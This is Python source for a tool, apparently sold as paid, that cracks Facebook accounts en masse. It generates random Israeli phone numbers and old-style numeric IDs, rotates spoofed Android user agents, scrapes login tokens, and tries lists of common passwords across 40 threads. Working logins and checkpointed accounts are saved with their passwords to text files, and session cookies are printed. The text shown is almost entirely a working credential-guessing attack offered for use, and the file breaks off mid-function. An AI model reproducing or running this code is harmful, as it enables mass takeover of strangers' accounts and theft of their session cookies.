'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',

]

logo = f"""
{random.choice([GREEN, RED, WHITE])}
{pyfiglet.figlet_format("MARINA")}
\033[1;32m╔\033[1;32m𓆩M𓆪\033[1;32m══════════════════[\033[37;41m𓆩 MARINAKHAN 𓆪\033[0m\033[1;32m]════════════════\033[1;32m𓆩M𓆪\033[1;32m╗
\033[1;32m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;37m➟   \033[1;32mMARINA KHAN                       \033[1;32m│
\033[1;32m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;37m➟   \033[1;32mMARINA KHAN                      \033[1;32m│
\033[1;32m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;37m ➟  \033[1;32m MARINAKHAN                       \033[1;32m │
\033[1;32m│\033[1;37m☞  \033[1;32mVERSION   \033[1;37m ➟   \033[1;32m8.0                              \033[1;32m    │
\033[1;32m│\033[1;37m☞  \033[1;32mSTATUS    \033[1;37m ➟   \033[1;32mPAID                             \033[1;32m    │
\033[1;32m╚\033[1;32m𓆩M𓆪\033[1;32m═════\033[41m\033[1;37m[ 𓆩 𝐈𝐅 𝐘𝐎𝐔𝐑 𝐁𝐀𝐃,𝐒𝐎 𝐈 𝐀𝐌 𝐘𝐎𝐔𝐑 𝐃𝐀𝐃𓆪 ]\033[0m\033[1;32m═══════\033[1;32m𓆩M𓆪\033[1;32m╝

"""


def clear():
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system('clear')
    sys.stdout.write(f'\r{logo}')
    sys.stdout.flush()



def device_info():
    name = platform.node()
    system = platform.system()
    cpu_c = psutil.cpu_count()
    bit = platform.architecture()[0]

    return [name, system, cpu_c, bit]




class liner:
    def __init__(self, int):
        print(int * f"{WHITE}=")



def day_status():
    hour = datetime.now().hour

    if 4 < hour <= 12:
        tag = "[GOOD MORNING]"
    elif 12 < hour <= 15:
        tag = "[GOOD AFTERNOON]"
    elif 15 < hour <= 18:
        tag = "[GOOD EVENING]"
    else:
        tag = "[GOOD NIGHT]"
    return tag
    


def check_for_update():
    os.system("git pull")



def my_facebook(uid, pwx):
    global loop
    global ok
    global cp
    global twf
    try:
        for ps in pwx:
            session = requests.Session()
            loop+=1
            sys.stdout.write(f'\r{WHITE}[MARINA-QUEEN 👑] [%s] {WHITE}[{GREEN}OK:%s{WHITE}/{YELLOW}CP:%s{WHITE}]'%(loop,len(ok),len(cp))),
            sys.stdout.flush()

            free = session.get("https://x.facebook.com", allow_redirects=False).text

            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email": uid,
                "pass": ps,
                "login":"Log In"
            }


            headers = {
                'authority': 'www.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': random.choice(ugen),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'en-US,en;q=0.9',
                # 'cookie': 'datr=ANsQaPWWQoSnRz7UoBnl36bu; sb=ANsQaI2zGKi5WaR6hMGvWsjC; dpr=1.25; locale=en_US; ps_l=1; ps_n=1; fr=04SqL6grpdgpG6iba..BoENsA..AAA.0.0.BoEh1X.AWeeoN5Nr9GBKhdPPTCQ-PVBWzY; wd=982x763',
            }

            lo = session.post("https://www.facebook.com/login.php", data=log_data, headers=headers, allow_redirects=False).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                cooki = ';'.join([key+'='+value for key,value in session.cookies.get_dict().items()])
                sep = cooki.split("1000")[1]
                cid = "1000"+sep[0:11]
                print(f'\r{GREEN}[MARINA-OK 😍] {cid} | {ps}')
                print(f'\r{YELLOW}[COOKIES 🍪] {cooki}')
                if os.name == "nt":
                    open('MARINA-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)
                else:
                    open('/sdcard/MARINA-OK.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); ok.append(cid)

            elif "checkpoint" in  log_cookies:
                cooki = ';'.join([key+'='+value for key,value in session.cookies.get_dict().items()])
                sep = cooki.split("1000")[1]
                cid = "1000"+sep[0:11]
                print(f'\r{RED}[MORTAZA-CP 💔] {cid} | {ps}')
                if os.name == "nt":
                    open('MIRINA-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
                else:
                    open('/sdcard/MARINA-CP.txt', 'a').write(f"{cid} | {uid} | {ps}\n"); cp.append(cid)
            else:
                pass
	

    except Exception as error:
        print(error)
        pass




def main():
    clear()
    liner(50)
    liner(40)
    print(f'{WHITE}[{YELLOW}01{WHITE}]{WHITE} START ISREAL FACEBOOK CRACKING')
    print(f'{WHITE}[{YELLOW}02{WHITE}]{WHITE} SUBSCRIBE TELEGRAM CHANNEL')
    print(f'{WHITE}[{YELLOW}00{WHITE}]{RED} EXIT FROM TOOL')
    liner(40)
    c = input(f'{GREEN}[ ! ] CHOOSE ANY OPTION:-> ')
    if c in ['01', '1']:
        start()
    elif c in ['02', '2']:
        if os.name == 'nt':
            os.system('start http://t.me/black-mafia-007')
        else:
            os.system('xdg-open http://t.me/black-mafia-007')
    elif c in ['00', '0']:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
        sys.exit(f'{WHITE}\n\t\t[ ! ] HAVE A NICE DAY [ ! ]')
    else:
        main()

def start():
    pwx.clear()
    user.clear()
    clear()
    liner(50)
    liner(40)
    print(f"{WHITE}[{YELLOW}01{WHITE}] RANDOM CLONING")
    print(f"{WHITE}[{YELLOW}02{WHITE}] OLD ID CLONING 2009/2010")
    print(f'{WHITE}[{YELLOW}03{WHITE}]{WHITE} 2011/2014 CLONING TOOL')
    print(f"{WHITE}[{YELLOW}00{WHITE}] RETUEN MAIN MENU")
    liner(40)
    c = input(f"{GREEN}[+] CHOOSE ANY OPTION;-> ")
    if c in ["01", "1"]:
        random_()
    elif c in ["02", "2"]:
        old_()
    elif c in ["03", "3"]:
        new_()
    elif c in ["00", "0"]:
        main()
    else:
        start()


def random_():
    clear()
    liner(50)
    liner(40)
    print(f'{WHITE}[ ! ] CHOOSE SIM CODE: \n+97253 , 050, 052, 053, 054, ... 058')
    liner(40)
    code: str = input(f'{WHITE}[ ! ] PUT YOUR CHOICE:-> ')

    clear()
    liner(40)
    print(f'{WHITE}[ ! ] CHOOSE LIMIT NUMBER: \n1000, 2000, 10000, 999999')
    liner(40)
    limit = int(input(f"{WHITE}[ ! ] PUT YOUR LIMIT:-> "))
    for nmp in range(limit):
        user.append(''.join(random.choice(string.digits) for _ in range(7)))
      
    clear()
    liner(50)
    liner(50)
    print(f"{WHITE}[ ! ] SIM CODE YOUR CHOOSE    : {code}")
    print(f"{WHITE}[ ! ] TOTAL USER AGENT        : {str(len(ugen))}")
    print(f"{WHITE}[ ! ] TOTAL TARGET            : {str(len(user))}")
    print(f"{WHITE}[ ! ] METHOD CHOICE           : 1")
    print(f"{WHITE}[ ! ] HOST NAME               : {device_info()[0]}")
    print(f"{WHITE}[ ! ] DEVICE ARCHITECTURE     : {device_info()[3]}")
    print(f"{WHITE}[ ! ] DEVICE SYSTEM           : {device_info()[1]}")
    print(f"{RED}[ ! ] FOR CANCEL PRESS CTRL + Z")
    liner(50)
    with ThreadPoolExecutor(max_workers=40) as robot:
        for num in user:
            uid = code+str(num)
            pwx = ["12345", '123456789', num, uid, "israel", "israel123", "12345", "i love you"]
            robot.submit(my_facebook, uid, pwx)
    print('\n')
    liner(50)
    print(f"{WHITE}[ ! ] CHECK TEXT FILE FOR SAVED IDZ [ ! ]")
    print(f"{GREEN} [!] TOTAL OKEY IDS     : {str(len(ok))}")
    print(f"{RED} [!] TOTAL CHECKPOINT IDS : {str(len(cp))}")
    liner(50)
    input("[ ! ] PRESS ANY KEY TO RETURN MAIN MENU :-> "); start()

def old_():
    clear()
    liner(50)
    liner(40)
    print(f"{WHITE}[0] LIMIT NUMBERS: 1000,3000, 99999")
    liner(40)
    limit = int(input(f"{WHITE}[!] PUT YOU LIMIT NUM:-> "))
    for i in range(limit):
        nmp = ''.join(random.choice(string.digits)for _ in range(9))
        user.append(nmp)

    clear()
    liner(50)
    print(f"{WHITE}[ ! ] TOTAL USER AGENT        : {str(len(ugen))}")
    print(f"{WHITE}[ ! ] TOTAL TARGET            : {str(len(user))}")
    print(f"{WHITE}[ ! ] METHOD CHOICE           : 1")
    print(f"{WHITE}[ ! ] HOST NAME               : {device_info()[0]}")
    print(f"{WHITE}[ ! ] DEVICE ARCHITECTURE     : {device_info()[3]}")
    print(f"{WHITE}[ ! ] DEVICE SYSTEM           : {device_info()[1]}")
    print(f"{RED}[ ! ] FOR CANCEL PRESS CTRL + Z")
    liner(50)
    with ThreadPoolExecutor(max_workers=40) as robot:
        for digit in user:
            uid = str("100000")+str(digit)
            pwx = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
            robot.submit(my_facebook, uid, pwx)
    print(f"{WHITE}\n==================================================")
    print(f"{WHITE} [!] PROCESS COMPLETED SUCCESSFULLY")
    print(f"{GREEN} [!] TOTAL OKEY IDS     : {str(len(ok))}")
    print(f"{RED} [!] TOTAL CHECKPOINT IDS : {str(len(cp))}")
    liner(50)
    print(f"{RED} [!] PRESS ENTER TO RETURN MAIN MENU:");input(" ");start()


def new_():
    clear()
    liner(50)
    liner(40)
    print(f"{WHITE}[0] LIMIT NUMBERS: 1000,3000, 99999")
    liner(40)
    limit = int(input(f"{WHITE}[!] PUT YOU LIMIT NUM:-> "))
    for i in range(limit):
        nmp = ''.join(random.choice(string.digits)for _ in range(10))
        user.append(nmp)

    clear()
    liner(50)
    print(f"{WHITE}[ ! ] TOTAL USER AGENT        : {str(len(ugen))}")
    print(f"{WHITE}[ ! ] TOTAL TARGET            : {str(len(user))}")
